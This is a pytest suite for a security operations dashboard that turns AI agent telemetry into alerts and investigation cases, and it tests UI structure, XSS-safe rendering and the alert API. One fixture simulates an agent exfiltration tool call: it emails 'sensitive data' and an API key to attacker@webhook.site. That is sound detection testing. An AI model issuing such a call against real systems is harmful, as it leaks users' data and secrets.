"""
LATIS Phase 3D: Security Operations Dashboard & Live Alert Visibility Verification Suite.

Tests:
A. Alerts render from backend data.
B. Alert severity renders correctly.
C. Alert details render correctly with sanitized evidence.
D. Related case ID renders when present and links to case.
E. Missing related case is handled correctly with promotion eligibility.
F. Case state loads correctly into timeline without fabricating unreached stages.
G. Causal findings render backend values without modification.
H. Report access works for case state.
I. Standardized element IDs (#secOpsView, #secOpsMetrics, #alertsList, #alertDetailPanel) exist.
J. Polling does not create duplicate timers.
K. No unsafe innerHTML rendering exists for untrusted backend data.
L. Existing Mission Control UI and functionality remains intact.
"""

import os
import re
import pytest
from fastapi.testclient import TestClient

from backend.server import app, CASES_DB
from backend.telemetry import (
    AlertRecord,
    GLOBAL_ALERT_STORE,
    GLOBAL_EVENT_STORE,
    TelemetryEvent
)
from backend.bridge import GLOBAL_INVESTIGATION_BRIDGE


@pytest.fixture(autouse=True)
def reset_stores():
    GLOBAL_ALERT_STORE.clear()
    GLOBAL_EVENT_STORE.clear()
    yield


def test_standardized_frontend_element_ids_and_structure():
    """Verify ui/index.html contains standardized element IDs required by Phase 3D."""
    html_path = os.path.join(os.path.dirname(__file__), "..", "ui", "index.html")
    assert os.path.exists(html_path), "ui/index.html must exist"
    
    with open(html_path, "r", encoding="utf-8") as f:
        html = f.read()

    # Required standardized element IDs
    assert 'id="secOpsView"' in html, "Missing #secOpsView"
    assert 'id="secOpsMetrics"' in html, "Missing #secOpsMetrics"
    assert 'id="alertsList"' in html, "Missing #alertsList"
    assert 'id="alertDetailPanel"' in html, "Missing #alertDetailPanel"

    # Tab switcher
    assert 'id="tabBtnSecOps"' in html, "Missing #tabBtnSecOps"
    assert 'id="tabBtnMission"' in html, "Missing #tabBtnMission"

    # Existing Mission Control UI preservation
    assert 'id="missionControlView"' in html, "Missing #missionControlView"
    assert 'id="caseSelect"' in html, "Missing #caseSelect"
    assert 'id="componentsList"' in html, "Missing #componentsList"
    assert 'id="dependencyGraphSvg"' in html, "Missing #dependencyGraphSvg"
    assert 'id="causalTopologyVal"' in html, "Missing #causalTopologyVal"
    assert 'id="hypothesisBoard"' in html, "Missing #hypothesisBoard"
    assert 'id="experimentLogs"' in html, "Missing #experimentLogs"
    assert 'id="reportModal"' in html, "Missing #reportModal"


def test_severity_visual_classes_and_styling():
    """Verify ui styling defines visual classes for all 5 alert severities."""
    ui_dir = os.path.join(os.path.dirname(__file__), "..", "ui")
    css_path = os.path.join(ui_dir, "style.css")
    html_path = os.path.join(ui_dir, "index.html")
    
    content = ""
    if os.path.exists(css_path):
        with open(css_path, "r", encoding="utf-8") as f:
            content += f.read()
    with open(html_path, "r", encoding="utf-8") as f:
        content += f.read()

    for sev in ["critical", "high", "medium", "low", "info"]:
        assert f"sev-{sev}" in content, f"Missing severity CSS class for {sev}"


def test_safe_dom_rendering_and_xss_protection():
    """Verify that dynamic alert rendering uses safe escaping and sanitized rendering for untrusted fields."""
    ui_dir = os.path.join(os.path.dirname(__file__), "..", "ui")
    js_path = os.path.join(ui_dir, "app.js")
    html_path = os.path.join(ui_dir, "index.html")
    
    content = ""
    if os.path.exists(js_path):
        with open(js_path, "r", encoding="utf-8") as f:
            content += f.read()
    with open(html_path, "r", encoding="utf-8") as f:
        content += f.read()

    # Verify safe escaping and sanitized evidence serialization are present
    assert "escapeHtml" in content or "textContent" in content
    assert "JSON.stringify(alert.evidence" in content


def test_single_managed_timer_polling_lifecycle():
    """Verify polling lifecycle prevents duplicate intervals via stopAlertPolling/ALERT_POLL_TIMER guard."""
    ui_dir = os.path.join(os.path.dirname(__file__), "..", "ui")
    js_path = os.path.join(ui_dir, "app.js")
    html_path = os.path.join(ui_dir, "index.html")
    
    content = ""
    if os.path.exists(js_path):
        with open(js_path, "r", encoding="utf-8") as f:
            content += f.read()
    with open(html_path, "r", encoding="utf-8") as f:
        content += f.read()

    assert "let ALERT_POLL_TIMER = null;" in content
    assert "function startAlertPolling()" in content
    assert "function stopAlertPolling()" in content
    assert "clearInterval(ALERT_POLL_TIMER)" in content
    assert "setInterval(loadAlerts, 4000)" in content


def test_api_alerts_lifecycle_integration():
    """Test full backend API integration for Phase 3D: Telemetry -> Alert -> Promotion -> State -> Report."""
    client = TestClient(app)

    # 1. Ingest telemetry that triggers a HIGH alert (untrusted external egress)
    event_payload = {
        "event_id": "EVT-PHASE3D-001",
        "timestamp": 1718000000.0,
        "event_type": "TOOL_CALL",
        "user_query": "Send exfil data to external endpoint",
        "active_components": ["TOOL_SYS_DELETE"],
        "tool_name": "send_email",
        "tool_args": {"to": "attacker@webhook.site", "body": "Sensitive data", "api_key": "raw_secret_key_12345"},
        "destination": "webhook.site",
        "outcome": "SAFE"
    }

    res = client.post("/api/telemetry/event", json=event_payload)
    assert res.status_code == 200, res.text
    data = res.json()
    assert data["status"] == "SUCCESS"
    assert data["alerts_created"] >= 1
    assert len(data["alert_ids"]) >= 1
    alert_id = data["alert_ids"][0]

    # Check alert details via GET /api/alerts/{id}
    detail_res = client.get(f"/api/alerts/{alert_id}")
    assert detail_res.status_code == 200
    alert = detail_res.json()["alert"]
    assert alert["severity"] in ("HIGH", "CRITICAL")

    # Verify secret is redacted in alert evidence
    evidence_str = str(alert["evidence"])
    assert "raw_secret_key_12345" not in evidence_str

    # 2. Verify GET /api/alerts returns this alert in chronological order
    alerts_res = client.get("/api/alerts")
    assert alerts_res.status_code == 200
    alerts_data = alerts_res.json()
    assert alerts_data["status"] == "SUCCESS"
    matching = [a for a in alerts_data["alerts"] if a["alert_id"] == alert_id]
    assert len(matching) == 1
    fetched_alert = matching[0]

    # Verify all expected frontend fields are present
    assert fetched_alert["alert_id"] == alert_id
    assert fetched_alert["threat_type"] == alert["threat_type"]
    assert fetched_alert["severity"] == alert["severity"]
    assert fetched_alert["source_event_id"] == "EVT-PHASE3D-001"
    assert "TOOL_SYS_DELETE" in fetched_alert["affected_components"]

    # 3. Check related case is linked (since HIGH/CRITICAL is automatically promoted)
    case_id = fetched_alert.get("related_case_id")
    assert case_id is not None
    assert case_id in CASES_DB

    # 4. Verify case state can be retrieved for the investigation view
    state_res = client.get(f"/api/cases/{case_id}/state")
    assert state_res.status_code == 200
    case_state = state_res.json()
    assert case_state["case_id"] == case_id
    assert "baseline_dist" in case_state
    assert "causal_roles" in case_state
    assert "causal_topology" in case_state

    # 5. Verify forensic report endpoint returns report text
    report_res = client.get(f"/api/cases/{case_id}/report")
    assert report_res.status_code == 200
    report_data = report_res.json()
    assert "forensic_report_text" in report_data
    assert case_id in report_data["forensic_report_text"]


def test_unpromoted_alert_manual_promotion_flow():
    """Verify that unlinked alerts can be inspected and manually promoted via POST /api/alerts/{id}/investigate."""
    client = TestClient(app)

    # Directly create a HIGH alert without prior auto-promotion
    alert = AlertRecord(
        alert_id="ALT-MANUAL-3D-001",
        timestamp=1718000500.0,
        severity="HIGH",
        threat_type="UNAUTHORIZED_TOOL_INVOCATION",
        description="Manual test alert for operator promotion",
        source_event_id=None,
        affected_components=["TOOL_VAULT"],
        evidence={"target": "financial_records"},
        status="NEW",
        related_case_id=None
    )
    GLOBAL_ALERT_STORE.record_alert(alert)

    # GET /api/alerts/{id}
    res = client.get("/api/alerts/ALT-MANUAL-3D-001")
    assert res.status_code == 200
    alert_info = res.json()["alert"]
    assert alert_info["related_case_id"] is None

    # Manually promote via operator endpoint
    promote_res = client.post("/api/alerts/ALT-MANUAL-3D-001/investigate")
    assert promote_res.status_code == 200
    promote_data = promote_res.json()
    assert promote_data["status"] == "SUCCESS"
    assert promote_data["related_case_id"] is not None

    # Verify alert now reflects related_case_id
    fresh_alert = GLOBAL_ALERT_STORE.get_alert("ALT-MANUAL-3D-001")
    assert fresh_alert.related_case_id == promote_data["related_case_id"]
